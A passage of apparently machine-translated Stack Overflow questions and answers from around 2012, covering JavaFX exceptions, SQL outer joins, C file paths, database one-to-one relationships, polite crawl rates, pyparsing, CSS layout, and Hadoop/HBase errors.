  125         pendingRunnables.incrementAndGet();
  126         waitForStart();
  127 
  128         if (SystemProperties.isDebug()) {
  129             Toolkit.getToolkit().pauseCurrentThread();
  130         }
  131 
  132         synchronized (runLaterLock) {
  133             if (!exiting && toolkitExit.get()) {
  134                 // Don't schedule a runnable after we have exited the toolkit
  135                 pendingRunnables.decrementAndGet();
  136                 return;
  137             }
  138 
  139             Toolkit.getToolkit().defer(new Runnable() {
  140                 @Override public void run() {
  141                     try {
  142                         r.run();
  143                         pendingRunnables.decrementAndGet();
  144                         checkIdle();
  145                     } catch (Throwable t) {
  146                         System.err.println("Exception in runnable");
  147                         t.printStackTrace();
  148                     }
  149                 }
  150             });
  151         }
  152     } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:24:10.557

一些托管线程（例如 UI 事件处理程序和 ExecutorServices）自己捕获 Throwable 以避免线程死亡。只有死掉的线程才会使用这个 UncaughtExceptionHandler。如果要捕获抛出的异常，则必须在可以抛出这些异常的方法中执行此操作。

如果 UI 事件处理程序有报告异常的方法，那将是另一种方法。

您的第二个示例将捕获该线程中引发的异常。其他线程上抛出的异常将被该线程捕获。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-06-27T12:44:57.597

将 EventDispatcher 设置为根节点对我有用。

```
 public class Frame extends Pane {
    Frame() {
        setEventDispatcher(new EventDispatcher() {

            @Override
            public Event dispatchEvent(Event event, EventDispatchChain chain) {
                try {
                    return chain.dispatchEvent(event);
                } catch (final Exception e) {
                    // handle all the exceptions here 
                    return null;
                }
            }
        });
    }
} 
```

# mysql - 空 id 选择行上的内部联接

> ID：12318865
> 
> 赞同：-1
> 
> 时间：2012-09-07T13:14:51.543
> 
> 标签：mysql, sql, tsql, inner-join

我们有两张表，一张有 id，一张有名字。某些 id 不是必需的（可以为空），例如：

```
rowId item1Id, item2Id, item3Id (item3Id can be null) 
```

在我们加入这两个表之后，我们得到了 id 和名称。但如果 item3 Id 为 null，则不显示该行。

一些数据：

> 表格1
> 
> rowId, item1Id, item2Id, item3Id
> 
> 1、2、3、4
> 
> 2、1、5、空

在我们的例子中，我们得到一行（1 行）

因此，如果它为空，则它在 Table2 中不存在并且该行未显示，但我们希望显示空。因此，当我们离开连接这两个表时，结果应该有 2 行。

这是 sql ：

```
SELECT Recipes.recipeId, Recipes.userId,Users.firstName + ' ' + Users.lastName as userName,  servingTypeId,
Codings.coding as servingType, categoryId, Codings_2.coding as healthAspects, continentId,
Codings_3.coding as continent, countryId, CodingsAssociated.coding as country, typeOfPreparationId,
Codings_4.coding as typeOfPreparation, flavourId, Codings_5.coding as flavour, preparationSkillId,
Codings_6.coding as preparationSkill, seasonId,  activePreparationTime,
overallPreparationTime, isLocalDelight, servings, Codings_7.coding as season ,
calories, youTubeId, datePosted, isComposite, Recipes.isApproved, Recipes.timestamp, title,
localDelightRegion, otherFeatures, cookingInstructions 
      FROM Recipes LEFT OUTER JOIN

      Codings ON Recipes.servingTypeId = Codings.codingKeyId LEFT OUTER JOIN
      Codings as Codings_2 ON Recipes.categoryId = Codings_2.codingKeyId LEFT OUTER JOIN
      Codings as Codings_3 ON Recipes.continentId = Codings_3.codingKeyId LEFT OUTER JOIN
      CodingsAssociated ON Recipes.countryId = CodingsAssociated.codingKeyId LEFT OUTER JOIN
      Codings as Codings_4 ON Recipes.typeOfPreparationId = Codings_4.codingKeyId LEFT OUTER JOIN
      Codings as Codings_5 ON Recipes.flavourId = Codings_5.codingKeyId LEFT OUTER JOIN
      Codings as Codings_6 ON Recipes.preparationSkillId = Codings_6.codingKeyId LEFT OUTER JOIN
      Codings as Codings_7 ON Recipes.seasonId = Codings_7.codingKeyId  LEFT OUTER JOIN
      RecipesTranslations ON Recipes.recipeId = RecipesTranslations.recipeId LEFT OUTER JOIN
      Users ON Recipes.userId = Users.userId

      WHERE CodingsAssociated.languageId = @languageId AND Codings.languageId = @languageId
      AND Codings_2.languageId = @languageId AND Codings_3.languageId = @languageId
      AND Codings_4.languageId = @languageId AND
      Codings_5.languageId = @languageId AND Codings_6.languageId = @languageId AND RecipesTranslations.languageId = @languageId
      AND Codings_7.languageId = @languageId 
```

例如，因为 seasonId 有时为空，所以不会显示 Codings_7.coding 的连接，但我也不会显示 ID 为空且名称也为空的这些行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:22:41.820

很难说，这里问的是什么，但我想你需要做一个外连接，从 tsql 标签我想你使用 MS SQL 服务器，所以你去：http: [//msdn.microsoft.com /en-us/library/aa213228(v=sql.80).aspx](http://msdn.microsoft.com/en-us/library/aa213228(v=sql.80).aspx)

例如：

```
SELECT *
FROM table1 a LEFT OUTER JOIN table2 b 
ON a.id_to_join_on = b.id_to_join_on 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:52:40.553

正如[Nikola Markovinović](https://stackoverflow.com/users/1231866/nikola-markovinovic)所说，您需要将 where 条件移至 join 条件

在这里您的选择更正：

```
SELECT
   Recipes.recipeId,
   Recipes.userId,
   ---
   cookingInstructions 
FROM
   Recipes
   LEFT OUTER JOIN Codings ON
      Recipes.servingTypeId = Codings.codingKeyId AND
      Codings.languageId = @languageId
   LEFT OUTER JOIN Codings as Codings_2 ON 
      Recipes.categoryId = Codings_2.codingKeyId AND
      Codings_2.languageId = @languageId
   LEFT OUTER JOIN Codings as Codings_3 ON
      Recipes.continentId = Codings_3.codingKeyId AND
      Codings_3.languageId = @languageId
   LEFT OUTER JOIN CodingsAssociated ON
      Recipes.countryId = CodingsAssociated.codingKeyId AND
      CodingsAssociated.languageId = @languageId 
   LEFT OUTER JOIN Codings as Codings_4 ON
      Recipes.typeOfPreparationId = Codings_4.codingKeyId AND
      Codings_4.languageId = @languageId
   LEFT OUTER JOIN Codings as Codings_5 ON
      Recipes.flavourId = Codings_5.codingKeyId AND
      Codings_5.languageId = @languageId
   LEFT OUTER JOIN Codings as Codings_6 ON
      Recipes.preparationSkillId = Codings_6.codingKeyId AND
      Codings_6.languageId = @languageId
   LEFT OUTER JOIN Codings as Codings_7 ON
      Recipes.seasonId = Codings_7.codingKeyId AND
      Codings_7.languageId = @languageId
   LEFT OUTER JOIN RecipesTranslations ON
      Recipes.recipeId = RecipesTranslations.recipeId AND
      RecipesTranslations.languageId = @languageId
   LEFT OUTER JOIN Users ON
      Recipes.userId = Users.userId ; 
```

# c - C 文件处理中的相对路径

> ID：12318866
> 
> 赞同：1
> 
> 时间：2012-09-07T13:14:59.393
> 
> 标签：c

我需要在我的程序中读取文件，因此在提供路径时我想提供相对路径，因为所有要打开的文件都将位于当前文件夹中的某个文件夹中。我试过这个：

```
FILE *f=fopen("./abc/p.txt","r") 
```

`abc`是带有当前文件夹的文件夹，但`fopen`返回`NULL`. 这件事怎么办？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-07T13:19:31.777

这来自其中之一：

*   `.`or`./abc/`不可读或不可遍历
*   `./abc/p.txt`不可读
*   `./abc/p.txt`不存在
*   `./abc/p.txt`是一个断开的链接

看看`errno`就知道真正的问题是什么。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2015-12-10T13:43:24.457

这将运行： FILE *f=fopen("...\\abc\\p.txt","r");

# c# - 读取 DLL app.setting 的问题

> ID：12318867
> 
> 赞同：0
> 
> 时间：2012-09-07T13:15:21.157
> 
> 标签：c#, dll, app-config, application-settings

我在 c# Visual Studio 2010 中读取 DLL 应用程序设置时遇到问题。我发布了使用反射解决方法的示例代码，因为 ConfigurationManager 失败。

```
private string LDAPDomain 
{  
    get
    {
        string strPath = System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName;
        string val = GetValues(strPath, "LDAPDomain"); 
        return val;
    }
}

//strPath is path of the file.
//strKey is key to access

private string GetValues(string strPath, string strKey)
{
    System.Configuration.Configuration con = System.Configuration.ConfigurationManager.OpenExeConfiguration(strPath);
    string strValue = con.AppSettings.Settings[strKey].Value;

    return strValue;
 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:21:30.073

如果您期望引用 DLL 的主项目来获取应用程序设置，那么它不会那样工作。将`ConfigurationManager`读取执行程序集的配置，如果您想使用它，您需要将所有必要的配置放入您的应用程序中。

或者，您可以*手动*读取 DLL 的 app.config 文件的内容 - 请参阅[此问题](https://stackoverflow.com/questions/5190539/equivalent-of-app-config-for-library-dll)以获取一些示例代码。

# android - 银河s3模拟器

> ID：12318868
> 
> 赞同：11
> 
> 时间：2012-09-07T13:15:27.437
> 
> 标签：android, emulation, samsung-mobile

Samsumg 是否为 Galaxy s3 提供了模拟器支持。我想在 S3 模拟器上测试我的应用程序，因为我正在阅读 google play 上关于该应用程序在三星 Galaxy S3 上崩溃的评论。有人可以帮我弄这个吗。提前致谢。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-07T13:26:20.213

您可以使用三星远程测试实验室

[三星远程测试选项卡](http://developer.samsung.com/remoteTestLab.do)

[或此链接以获得您](http://www.perfectomobile.com)的支持 （它提供 1 小时免费试用来测试您的应用程序。）

**已编辑**

对于模拟器，您可以使用以下信息。

**目标：Google API - API 级别 15 皮肤：内置 WXGA720**

```
Hardware Back/Home: yes
Abstracted LCD density: 320
Keyboard lid support: no
Max VM application heap size: 48
Device ram size: 1024 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:26:07.623

//您可以简单地将您的模拟器设置设置为

`WXGA720`抽象 LCD 密度为 320 的皮肤。

# http - 如何检测我可以在某人的服务器上安全执行的合理数量的并发请求？

> ID：12318869
> 
> 赞同：0
> 
> 时间：2012-09-07T13:15:35.363
> 
> 标签：http, concurrency, web-crawler, denial-of-service

我从网上抓取了一些数据，因为没有 API。不幸的是，这是来自几个不同站点的大量数据，我很快了解到我不能在短时间内向同一个站点发出数千个请求......我想尽快处理数据，但我不不想引起 DOS 攻击 :)

问题是，每台服务器都有不同的功能，而我事先并不知道它们。这些网站属于我的客户，所以我的目的是防止我的脚本导致任何可能的停机。所以没有像“*我会先尝试百万请求，如果失败，我会尝试 50 万，如果失败......* ”这样的政策：)

有什么最佳做法吗？Google 的爬虫如何知道它可以同时对同一个站点执行多少个请求？也许他们“打乱他们的播放列表”，所以对单个站点的并发请求并不多。我可以通过 HTTP 以某种方式检测到这些东西吗？等待单个请求，计算响应时间，大致猜测服务器的平衡程度，然后以某种方式构成最大并发请求数？

我使用 Python 脚本，但这对于答案并不重要 - 只是为了让您知道我更喜欢哪种语言的潜在代码片段。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:18:55.847

谷歌蜘蛛非常聪明。在我的小网站上，它每分钟到第二个页面会打到我一页。他们显然有一个页面队列，已填满，牢记时间和站点。我还想知道他们是否足够聪明，不会在同一台服务器上访问多个域——因此可以识别 IP 范围和 URL。

对于任何蜘蛛来说，将在特定时间将要被蜘蛛抓取的 URL 排队的工作与实际的蜘蛛工作分开，这将是一个很好的架构。您所有的蜘蛛都可以使用`urlToSpiderService.getNextUrl()`阻止（如有必要）的方法，除非要蜘蛛下一个 URL。

我相信谷歌会查看网站上的页面数量来确定蜘蛛速度。在给定时间内刷新的页面越多，它们访问该特定服务器的速度就越快。您当然应该能够将其用作指标，尽管在您进行初始爬网之前很难确定。

您可以从每分钟一页开始，然后随着特定站点的要爬取的页面的增加，您将减少延迟。需要类似以下的某种功能：

```
 public Period delayBetweenPages(String domain) {
     take the number of pages in the to-do queue for the domain
     divide by the overall refresh period that you want to complete in
     if more than a minute then just return a minute
     if less than some minimum then just return the minimum
 } 
```

> 我可以通过 HTTP 以某种方式检测到这些东西吗？

有了现代互联网，我看不出你怎么能。当然，如果服务器在几秒钟后返回或返回 500 错误，那么您应该节流回来，但是*如今*对于大部分服务器来说，典型的连接和下载是亚秒级的，我不确定有多少从该领域的任何统计数据中学习。

# database - 什么时候应该使用一对一的关系？

> ID：12318870
> 
> 赞同：111
> 
> 时间：2012-09-07T13:15:36.977
> 
> 标签：database, database-design, relational-database

很抱歉这个菜鸟问题，但是否真的需要与数据库中的表使用一对一的关系？您可以在一个表中实现所有必要的字段。即使数据变得非常大，您也可以在`SELECT`语句中枚举您需要的列名，而不是使用`SELECT *`. 你什么时候真的需要这种分离？

* * *

## 回答 #1

> 赞同：133
> 
> 时间：2012-09-07T15:40:30.350

## 1 到 0..1

*   超类和子类之间的“1 到 0..1”被用作[实现继承](https://stackoverflow.com/a/12037398/533120)的“所有类在单独的表中”策略的一部分。

*   “1 到 0..1”可以在单个表中表示，其中“0..1”部分由可空字段覆盖。但是，如果关系*主要是*“1 到 0”且只有少数“1 到 1”行，则将“0..1”部分拆分到单独的表中可能会节省一些存储（和缓存性能）优势。一些数据库在存储 NULL 方面比其他数据库更节俭，因此这种策略变得可行的“截止点”可能会有很大差异。

## 1比1

*   真正的“1 对 1”对数据进行垂直分区，这可能对缓存有影响。数据库通常在页面级别实现缓存，而不是在单个字段级别，因此即使您从一行中仅选择几个字段，通常也会缓存该行所属的整个页面。如果一行很宽而选定的字段相对较窄，您最终会缓存很多您实际上并不需要的信息。在这种情况下，对数据进行垂直分区可能很有用，因此*只有*更窄、更频繁使用的部分或行被缓存，因此更多的数据可以放入缓存中，从而使缓存有效地“更大”。

*   垂直分区的另一个用途是改变锁定行为：数据库通常不能在单个字段级别锁定，只能锁定整个行。通过拆分行，您允许锁定仅在其一半上发生。

*   触发器通常也是特定于表的。虽然理论上您可以只有一个表并让触发器忽略行的“错误的一半”，但某些数据库可能会对触发器可以做什么和不可以做什么施加额外的限制，这可能会使这不切实际。例如，Oracle 不允许您修改变异表 - 通过拥有单独的表，其中只有一个可能正在变异，因此您仍然可以从触发器修改另一个表。

*   单独的表可能允许更细粒度的安全性。

这些考虑在大多数情况下是无关紧要的，因此在大多数情况下，您应该考虑将“1 对 1”表合并为一个表。

另请参阅：[为什么在数据库设计中使用一对一关系？](https://stackoverflow.com/a/9688442/533120)

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2017-05-09T22:01:52.303

我的 2 美分。

我在一个我们都在一个大型应用程序中开发的地方工作，一切都是一个模块。例如，我们有一个`users`表，我们有一个为用户添加 facebook 详细信息的模块，另一个为用户添加 twitter 详细信息的模块。我们可以决定拔掉其中一个模块并从我们的应用程序中删除它的所有功能。在这种情况下，每个模块都将自己的表以 1:1 的关系添加到全局`users`表中，如下所示：

```
create table users ( id int primary key, ...);
create table users_fbdata ( id int primary key, ..., constraint users foreighn key ...)
create table users_twdata ( id int primary key, ..., constraint users foreighn key ...) 
```

* * *

## 回答 #3

> 赞同：29
> 
> 时间：2012-09-07T13:20:55.050

如果您将两个一对一的表合二为一，您可能会遇到语义问题。例如，如果每个设备都有一个遥控器，那么将设​​备和遥控器及其一系列特性放在一个表中听起来不太好。您甚至可能不得不花时间确定某个属性是否属于设备或遥控器。

在某些情况下，您的一半列会长时间保持空白，或者永远不会被填满。例如，一辆汽车可能有一个拖车具有一堆特征，或者可能没有。所以你会有很多未使用的属性。

如果您的表有 20 个属性，并且偶尔使用其中的 4 个，那么出于性能问题将表分成 2 个表是有意义的。

在这种情况下，把所有东西都放在一张桌子上是不好的。此外，处理一个有 45 列的表并不容易！

* * *

## 回答 #4

> 赞同：25
> 
> 时间：2012-09-07T13:20:17.140

如果一个表中的数据与另一个表描述的实体相关，但不“属于”另一个表，则可以将其分开。

如果单独的数据也需要与某个其他实体相关联，这在未来可能会提供优势。

* * *

## 回答 #5

> 赞同：16
> 
> 时间：2012-09-07T13:29:27.423

如果有两个单独的概念只能以这种方式关联，那么使用它的最明智的时间是。例如，一辆车只能有一个当前的司机，司机一次只能驾驶一辆车——所以汽车和司机的概念之间的关系是 1 对 1。我接受这是一个人为的例子来演示观点。

另一个原因是你想以不同的方式专门化一个概念。如果您有一个 Person 表并且想要添加不同类型的 Person 的概念，例如 Employee、Customer、Shareholder - 其中每一个都需要不同的数据集。它们之间相似的数据将在 Person 表上，专家信息将在 Customer、Shareholder、Employee 的特定表上。

一些数据库引擎难以有效地将新列添加到一个非常大的表（许多行）中，我已经看到用于包含新列的扩展表，而不是将新列添加到原始表中。这是附加表更可疑的用途之一。

您可能还决定将单个概念的数据划分为两个不同的表，以解决性能或可读性问题，但如果您从头开始，这是一个相当特殊的情况 - 这些问题将在稍后显示。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2012-09-07T13:19:07.953

不经常。

如果您需要实现一些安全性，您可能会发现一些好处 - 因此某些用户可以看到某些列（table1）但看不到其他列（table2）..

当然，有些数据库 (Oracle) 允许您在同一张表中执行这种安全性，但其他一些可能不允许。

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2012-09-07T13:23:40.440

您指的是数据库规范化。在我维护的应用程序中，我能想到的一个例子是 Items。该应用程序允许用户销售许多不同类型的项目（即 InventoryItems、NonInventoryItems、ServiceItems 等）。虽然我可以将每个项目所需的所有字段存储在一个 Items 表中，但维护一个包含所有项目共有字段的基本 Item 表，然后为每个项目类型（即 Inventory、NonInventory、等），其中包含特定于该项目类型的字段。然后，项目表将具有它所代表的特定项目类型的外键。特定项目表和基本项目表之间的关系将是一对一的。

下面是一篇关于规范化的文章。

[http://support.microsoft.com/kb/283878](http://support.microsoft.com/kb/283878)

* * *

## 回答 #8

> 赞同：7
> 
> 时间：2016-08-21T22:58:34.403

首先，我认为这是一个建模和定义一个独立实体的问题。假设您拥有`customers`一个且只有一个 single `address`。当然，您可以在一个表中实现所有内容`customer`，但是如果将来您允许他拥有 2 个或更多地址，那么您将需要对其进行重构（这不是问题，但要做出有意识的决定）。

我还可以想到一个在其他答案中没有提到的有趣案例，其中拆分表格可能很有用：

再次想象一下，您每个人都有`customers`一个`address`，但这次可以选择有一个地址。当然，您可以将其实现为一堆`NULL`-able 列，例如`ZIP,state,street`. 但是假设你*确实有*一个不是可选的，而是`address`这个。如何在单个表中建模？您可以在表上使用约束，但在另一个表中划分并使foreign_key 可为空要容易得多。这样，您的模型更明确地说*实体*是可选的，这是该实体的可选属性。`state``ZIP``customer` *`address``ZIP`*

 ** * *

## 回答 #9

> 赞同：5
> 
> 时间：2012-09-07T13:25:44.987

与所有设计问题一样，答案是“视情况而定”。

有几点考虑：

*   表将有多大（在字段和行方面）？从维护和编程的角度来看，将用户名、密码与其他不太常用的数据一起存放可能很不方便

*   随着时间的推移，组合表中具有约束的字段可能会变得难以管理。例如，如果触发器需要针对特定​​字段触发，那么每次更新表都会发生这种情况，无论该字段是否受到影响。

*   你有多确定这种关系会是 1:1？正如[这个](https://stackoverflow.com/questions/4378591/how-to-save-marital-relationship-in-a-database?rq=1)问题所指出的，事情很快就会变得复杂。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2015-01-05T03:58:30.877

我在实践中通常会遇到两种一般的 1:1 关系：

1.  IS-A 关系，也称为超类型/子类型关系。这是当一种实体实际上是另一种实体的类型时（EntityA IS A EntityB）。例子：

    *   个人实体，在同一公司内具有不同的会计、工程师、销售人员实体。
    *   Item 实体，具有 Widget、RawMaterial、FinishedGood 等单独的实体。
    *   汽车实体，具有卡车、轿车等单独的实体。

    在所有这些情况下，超类型实体（例如 Person、Item 或 Car）将具有所有子类型共有的属性，而子类型实体将具有每个子类型唯一的属性。子类型的主键与超类型的主键相同。

2.  “老板”关系。这是当一个人是组织单位（部门、公司等）的唯一老板或经理或主管时。当一个组织单元只允许一个老板时，代表老板的个人实体和组织单元实体之间存在 1:1 的关系。

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2013-05-22T18:37:30.953

另一个用例如下：您可以从某个来源导入数据并每天更新它，例如关于书籍的信息。然后，您自己添加有关某些书籍的数据。然后将导入的数据放在另一个表中而不是您自己的数据中是有意义的。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2021-09-22T02:49:14.520

使用一对一关系的主要时间是在涉及继承时。

下面，一个人可以是员工和/或客户。员工和客户继承人员属性。优点是如果一个人是员工和客户，他们的详细信息只存储一次，在通用人员表中。子表具有特定于员工和客户的详细信息。

[![一对一关系ERD](../Images/ce2d7e33a8967a7fae9fe7a8c39d509b.png)](https://i.stack.imgur.com/MOFj6.png)

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2019-01-31T10:22:22.893

另一个用例可能是超过了数据库表中的最大列数。然后你可以使用 OneToOne 加入另一个表

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2015-11-11T20:08:19.207

在我编程的时候，我只在一种情况下遇到过这种情况。即相同的 2 个实体（“实体 A”和“实体 B”）之间存在一对多和一对一的关系。

当“Entity A”有多个“Entity B”，“Entity B”只有1个“Entity A”，“Entity A”只有1个当前的“Entity B”，“Entity B”只有1个“Entity A”。

例如，一辆车只能有一个当前的司机，司机一次只能驾驶一辆车 - 所以汽车和司机的概念之间的关系是 1 对 1。 - 我从@Steve Fenton 的答案中借用了这个例子

驾驶员可以驾驶多辆汽车，但不能同时驾驶。所以 Car 和 Driver 实体是一对多或多对多的。但是如果我们需要知道当前的司机是谁，那么我们还需要一对一的关系。*

# perl - perl 文件::尾延迟

> ID：12318878
> 
> 赞同：0
> 
> 时间：2012-09-07T13:16:28.543
> 
> 标签：perl, perl-module

我正在使用 perl File::Tail 库来跟踪文件的输出并解析它的输出。

一切正常，除了在我启动脚本后开始输出之前似乎有大约 10 秒的延迟。第一次读取后，它工作正常，所有输出都是瞬时的。一旦开始工作，延迟期间的所有写入似乎都会输出，所以我不会丢失任何数据。我认为这与我正在阅读的文件无关，因为运行常规的“tail -f”可以立即工作。

这是整个脚本：

```
#!/bin/perl
use File::Tail;

$file=File::Tail->new("file.txt");

while (defined($line=$file->read)) {
    print "$line\n";
} 
```

我从网上某处的一个例子中复制了这个。我对 perl 或 File::Tail 不是很熟悉，我希望我做错了什么。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:31:08.577

请参阅`interval`文档中的选项：

> 在第一次检查文件之前将花费睡眠的初始秒数（实数）。默认为 10 秒，这意味着“File::Tail”将休眠 10 秒，然后确定文件中出现了多少新行。

# css - 多列 CSS 最小高度 100%

> ID：12318885
> 
> 赞同：1
> 
> 时间：2012-09-07T13:17:00.617
> 
> 标签：css, height, multiple-columns

我按照本[**指南**](http://matthewjamestaylor.com/blog/equal-height-columns-cross-browser-css-no-hacks)帮助设置我的页面的列。

如果屏幕大于内容，我想要做的是让我的列填满屏幕，但是当内容长于浏览器屏幕一次可以显示时，使用默认的溢出滚动或自动。

目前，我将 body、我的容器（文章中描述的容器周围的 div）和文章中描述的容器设置为 height: 100%。当页面适合所有内容时这很好，但是当屏幕太小时，内容就会被截断。

我尝试通过将主体或我的容器更改为最小高度到 100% 来解决此问题，虽然这会使较小的屏幕再次显示所有内容，但在较大的屏幕中，2 列“背景”不会延伸到页面底部，但我的容器可以。

编辑：我的 html 和 body 目前也设置为 100% 的高度。

Edit2：这是一个[**jsfiddle**](http://jsfiddle.net/8DNmh/1/)，用于显示内容大于屏幕时的外观

现在结构是这样的：

```
body (height: 100%)
    my_container (height: 100%)
        container2 (height: 100%)
            container1 (height: 100%)
                column1
                column2 
```

我希望它确实像

```
body
    my_container (min-height: 100%)
        container2 (height: 100%)
            container1 (height: 100%)
                column1
                column2 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-19T02:16:38.943

只需删除高度：100%；来自你的 CSS。

[http://jsfiddle.net/8DNmh/2/](http://jsfiddle.net/8DNmh/2/)

# python - 在pyparsing中检测变量类型

> ID：12318888
> 
> 赞同：3
> 
> 时间：2012-09-07T13:17:37.500
> 
> 标签：python, pyparsing

我有这样的令牌序列：

```
TokenName(alphanum) value(printable) value(printable, optional) value(printable, optional) Literal(';') 
```

例如：

```
Token1 "stringValue with escaped data eg: \" in it";
Token2 12;
Token3 0xaaaa; // and hex string indicated by 0x
Token4 "value1" 2 0xbbcc; 
```

结果我除外：

```
[
    ['Token1', 'stringValue with escaped data eg: " in it'],
    ['Token2', 12],
    ['Token3', '0xaaaa'],
    ['Token4', ['value1', 2, '0xbbcc']],
] 
```

现在我有这样的事情：

```
import pyparsing as p
non_semi = ''.join(c for c in p.printables if c != ';')
semi = p.Literal(';').suppress()

single_value = p.Word(non_semi) + semi
multi_value = p.Group(
    p.Word(non_semi) +
    p.Word(non_semi) +
    p.Optional(p.Word(non_semi)) +
    semi
)

value = single_value | multi_value
assignment = p.Group(p.Word(p.alphanum) + value)

bnf = p.Group(p.OneOrMore(assignment))
bnf.ignore(p.cStyleComment) 
```

但是这段代码，不会`12`变成字符串，`int(12)`也可以获取`"`字符，pyparsing可以处理这个值转换吗？

**编辑**

好的，我知道如何处理字符串：[QuotedString](http://packages.python.org/pyparsing/pyparsing.pyparsing.QuotedString-class.html)有很大帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:56:48.383

好的，我找到了我的答案：

用于处理字符串：[QuotedString](http://packages.python.org/pyparsing/pyparsing.pyparsing.QuotedString-class.html)

为了处理 int 和其他转换，有`setParseAction`一个令牌 def 的方法，女巫可以采用例如。`lambda s, l, t: int(s)`帕拉姆女巫会成功的

# css - 当我滚动页面时，Ie7 重绘错误

> ID：12318889
> 
> 赞同：-2
> 
> 时间：2012-09-07T13:17:37.937
> 
> 标签：css, internet-explorer-7, twitter-bootstrap

> **可能重复：**
> [页面滚动时 IE7 上的问题。文本不正确](https://stackoverflow.com/questions/12315896/issue-on-ie7-when-page-is-scrolling-text-is-not-proper)

当我滚动页面时，搜索按钮不正确。我在这里使用了引导程序。

如果我要减小字体大小并使 font-weight:normal 正常，否则我在 twitter bootstrap 文档中做同样的事情同样的问题来了。

![在此处输入图像描述](../Images/13c5fb1b07a06027e54c77011e3cc72b.png)

这是测试服务器的网址

[http://www.onetravel.com/travel/test/ot-bootstrap/index.html](http://www.onetravel.com/travel/test/ot-bootstrap/index.html)

如果无法在 ie7 中重现，请发表评论 :-) 提前thanx

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T14:01:04.403

~~我无法在 IE7 中重现（IE9 的浏览器和文档模式设置为 7）。~~

~~请提供更多信息或可重复的示例，我很乐意提供帮助。~~

**编辑：**

似乎当鼠标滚动后进入页面时，它会重绘按钮。根据我的浏览经验，很难注意到。我建议[当它变得可见时](https://stackoverflow.com/questions/487073/check-if-element-is-visible-after-scrolling/488073#answer-488073)[强制它重绘](https://stackoverflow.com/questions/8840580/force-dom-redraw-refresh-on-chrome-mac#answer-8840703)按钮。

这个小的 jQuery 方法将处理这个问题，尽管可以进行进一步的优化。如果需要调整，请对其进行测试并发表评论。

```
$('#my-button').RedrawWhenVisible();

$.fn.RedrawWhenVisible = function()
{

    $(window).scroll(function() {
        var docViewTop = $(window).scrollTop();
        var docViewBottom = docViewTop + $(window).height();

        var elemTop = this.offset().top;
        var elemBottom = elemTop + this.height();

        // If element is partially visible...
        if((elemBottom <= docViewBottom && elemBottom >= docViewTop) || (elemTop >= docViewTop && elemTop <= docViewBottom)) {
            //Redraw it, just once.
            if(this.attr('data-redraw')) {                
                this.hide().show();
                // Prevent further draws.
                this.removeAttr('data-redraw');
            }
        } else {
            // The element is not visible...
            if(!this.attr('data-redraw')) {
                // Flag it to redaw on scroll.
                this.attr('data-redraw','redraw');
            }
        }
    }
} 
```

**编辑2：**

由于另一个按钮很好，我敢打赌这是一个非常具体的 CSS 问题。仔细检查这些 CSS 类的所有属性，灰色按钮很好，因此请检查该按钮与橙色/黄色按钮的不同之处。

# java - WSO2 身份服务器的 MEX 端点

> ID：12318890
> 
> 赞同：1
> 
> 时间：2012-09-07T13:17:38.767
> 
> 标签：java, wso2, wso2is

我正在尝试使用 STS 服务、Web 服务和客户端设置 STS 测试场景。安全令牌服务来自 WSO2 的身份服务器并在端点运行

```
https://[domain]:9443/services/wso2carbon-sts/ 
```

Web服务和客户端是用Netbeans用Java编写的。我运行客户端并得到：

```
 WST0017:Could not obtain STS metadata. MEX call to STS https://[domain]:9443/services/wso2carbon-sts/mex failed. 
```

WSO2 中 Secure Token Service 的 MEX 服务的端点是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T10:51:12.867

MEX 是一种协议，旨在帮助自动识别被调用的 Web 服务的详细信息。当调用库需要 WSDL 但提供了指向端点的 URL 时，往往会发生这些不明显的错误。结果，它尝试使用 MEX 来查找 WSDL，但由于服务器未实现 MEX，因此失败并返回这些不明显的错误。

实际上，修复几乎总是将 URL 提供给 WSDL（其中包含端点 URL 的详细信息），而不是直接提供给端点。我对 WSO2 知之甚少，但通常通过附加 ?wsdl 或类似端点 URL 来公开 WSDL。

# java - 将文件加载到 Hbase MapReduce 时出现 InvalidInputException

> ID：12318891
> 
> 赞同：1
> 
> 时间：2012-09-07T13:17:40.187
> 
> 标签：java, hadoop, mapreduce, hbase

我对 Hadoop 和 Map Reduce 非常陌生。对于起始基地，我执行了字数统计程序。它执行得很好，但是当我尝试将 csv 文件运行到我遵循 [Csv File][1] 的 Htable 中时，它让我陷入了以下我不知道的错误，请任何人帮助我了解上述错误

```
 12/09/07 05:47:31 ERROR security.UserGroupInformation: PriviledgedActionException as:hduser cause:org.apache.hadoop.mapreduce.lib.input.InvalidInputException: Input path   [1]: http://salsahpc.indiana.edu/ScienceCloud/hbase_hands_on_1.htm#shell_exercises 
```

这个错误真的很浪费我的时间，请任何人都可以帮助我解决这个异常

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T07:47:20.513

您指向路径 hdfs://HadoopMaster:54310/user/hduser/csvtable 而不是 csvtable 的问题是。1）将您的 Hbase jar 添加到 Hadoop 类路径中，因为您的 Map reduce 默认情况下不会配置为 hbase jar。2) 转到 hadoop-ev.sh 并编辑 Hadoop_classpath 并将所有 hbase jar 添加到其中。希望它现在可以工作

* * *

